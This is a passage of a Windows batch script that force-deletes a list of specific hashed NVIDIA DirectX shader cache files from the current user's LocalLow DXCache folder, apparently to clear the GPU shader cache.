if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_3_0.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4a0c48fd55971c40_3_0.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4b3b163ca8802d93_0_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4b3b163ca8802d93_0_0.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4b3b163ca8802d93_0_0.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_4b3b163ca8802d93_0_0.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_5611dee3a455427d_0_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_5611dee3a455427d_0_0.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_5611dee3a455427d_0_0.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_5611dee3a455427d_0_0.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_5611dee3a455427d_0_3.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_5611dee3a455427d_0_3.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_5611dee3a455427d_0_3.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_5611dee3a455427d_0_3.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_7ede4a22f9a298b0_0_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_7ede4a22f9a298b0_0_0.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_7ede4a22f9a298b0_0_0.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_7ede4a22f9a298b0_0_0.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8659987bb44153db_0_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8659987bb44153db_0_0.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8659987bb44153db_0_0.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8659987bb44153db_0_0.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8659987bb44153db_0_3.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8659987bb44153db_0_3.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8659987bb44153db_0_3.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8659987bb44153db_0_3.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8659987bb44153db_1_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8659987bb44153db_1_0.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8659987bb44153db_1_0.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8659987bb44153db_1_0.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8659987bb44153db_1_0.1.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8659987bb44153db_1_0.1.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8659987bb44153db_2_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8659987bb44153db_2_0.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8659987bb44153db_2_0.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8659987bb44153db_2_0.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8eb384791ff76034_0_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8eb384791ff76034_0_0.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8eb384791ff76034_0_0.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8eb384791ff76034_0_0.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8eb384791ff76034_0_3.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8eb384791ff76034_0_3.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8eb384791ff76034_0_3.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_8eb384791ff76034_0_3.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_0.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_0.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_0.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_0.1.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_0.1.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_0.1.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_0.1.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_1.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_1.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_1.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_1.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_1.1.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_1.1.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_1.1.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_1.1.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_1.2.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_1.2.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_1.2.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_1.2.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_3.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_3.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_3.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a4809bca83584be0_0_3.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a7f254afdbd9f616_0_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a7f254afdbd9f616_0_0.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a7f254afdbd9f616_0_0.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_a7f254afdbd9f616_0_0.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_bb7b32b6d5ec1bc3_0_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_bb7b32b6d5ec1bc3_0_0.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_bb7b32b6d5ec1bc3_0_0.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_bb7b32b6d5ec1bc3_0_0.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_bb7b32b6d5ec1bc3_0_0.1.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_bb7b32b6d5ec1bc3_0_0.1.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_bb7b32b6d5ec1bc3_0_1.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_bb7b32b6d5ec1bc3_0_1.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_bb7b32b6d5ec1bc3_0_1.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_bb7b32b6d5ec1bc3_0_1.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_bb7b32b6d5ec1bc3_0_1.1.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_bb7b32b6d5ec1bc3_0_1.1.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_0.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_0.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_0.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_0.1.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_0.1.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_0.1.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_0.1.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_0.2.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_0.2.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_0.2.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_0.2.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_0.3.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_0.3.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_1.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_1.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_1.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_1.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_1.1.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_1.1.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_1.1.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_1.1.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_1.2.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_1.2.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_1.2.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_1.2.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_1.3.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_1.3.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_1.3.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_1.3.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_1.4.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_1.4.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_3.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_3.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_3.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_be4cb461d6f8ddbc_0_3.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_cca151335a8e70d2_0_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_cca151335a8e70d2_0_0.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_cca151335a8e70d2_0_0.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_cca151335a8e70d2_0_0.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_cca151335a8e70d2_0_1.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_cca151335a8e70d2_0_1.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_cca151335a8e70d2_0_1.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_cca151335a8e70d2_0_1.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_0.0.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_0.0.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_0.0.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_0.0.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_0.1.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_0.1.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_0.1.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_0.1.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_0.2.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_0.2.bin"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_0.2.toc" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_0.2.toc"
if exist "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_0.3.bin" del /f /q "C:\Users\%USERNAME%\AppData\LocalLow\NVIDIA\PerDriverVersion\DXCache\169b93206d78c61b7d90892adcd03e0c_fce8395c8fd8a9db_d4ba61391fc30291_0_0.3.bin"
